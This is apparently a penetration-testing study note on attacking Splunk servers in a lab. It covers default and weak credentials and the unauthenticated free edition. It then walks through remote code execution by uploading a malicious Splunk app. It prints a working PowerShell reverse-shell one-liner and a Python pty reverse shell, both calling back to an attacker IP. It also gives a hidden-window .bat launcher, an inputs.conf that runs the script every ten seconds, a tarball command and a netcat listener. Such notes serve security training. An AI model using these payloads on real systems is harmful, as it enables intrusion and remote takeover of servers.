# Splunk Attacks

* \
  Splunk web server runs by default on port 8000
  * works on https
* On older versions of Splunk, the default credentials are `admin:changeme`
  * If the default credentials do not work, it is worth checking for common weak passwords such as `admin`, `Welcome`, `Welcome1`, `Password123`, etc.

### Enumeration

* The Splunk Enterprise trial converts to a free version after 60 days, which doesn’t require authentication - It is not uncommon for system administrators to install a trial of Splunk to test it out, which is subsequently forgotten about. - This will automatically convert to the free version that does not have any form of authentication, introducing a security hole in the environment - Some organizations may opt for the free version due to budget constraints, not fully understanding the implications of having no user/role management.&#x20;

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Splunk has multiple ways of running code, such as
  * server-side Django applications
  * REST endpoints
  * scripted inputs
  * alerting scripts
* A common method of gaining remote code execution on a Splunk server is through the use of a scripted input

### Attacking Splunk

* We can use [this](https://github.com/0xjpuff/reverse_shell_splunk) Splunk package to assist us.
  * The `bin` directory in this repo has examples for [Python](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py) and [PowerShell](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1)
* The `bin` directory will contain any scripts that we intend to run (in this case, a PowerShell reverse shell), and the default directory will have our `inputs.conf` file
* &#x20;Our reverse shell will be a PowerShell one-liner.

```powershell-session
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

* The [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) file tells Splunk which script to run and any other conditions.
  * Here we set the app as enabled and tell Splunk to run the script every 10 seconds.
  * The interval is always in seconds, and the input (script) will only run if this setting is present.

```shell-session
cat inputs.conf 
```

```shell-session
[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

* We need the .bat file, which will run when the application is deployed and execute the PowerShell one-liner.

```shell-session
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

* Once the files are created, we can create a tarball or `.spl` file.

```shell-session
tar -cvzf updater.tar.gz splunk_shell/
```

* The next step is to choose `Install app from file` and upload the application.

```
https://10.129.201.50:8000/en-US/manager/search/apps/local
```

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Before uploading the malicious custom app, let's start a listener using Netcat or [socat](https://linux.die.net/man/1/socat).

```shell-session
 sudo nc -lnvp 443
```

* On the `Upload app` page, click on browse, choose the tarball we created earlier and click `Upload`.

```
https://10.129.201.50:8000/en-US/manager/appinstall/_upload?breadcrumbs=Settings%7C%2Fmanager%2Fsearch%2F%09Apps%7C%2Fmanager%2Fsearch%2Fapps%2Flocal
```

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* As soon as we upload the application, a reverse shell is received as the status of the application will automatically be switched to `Enabled`.
* If we were dealing with a **Linux host**, we would need to edit the `rev.py` Python script before creating the tarball and uploading the custom malicious app

```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```
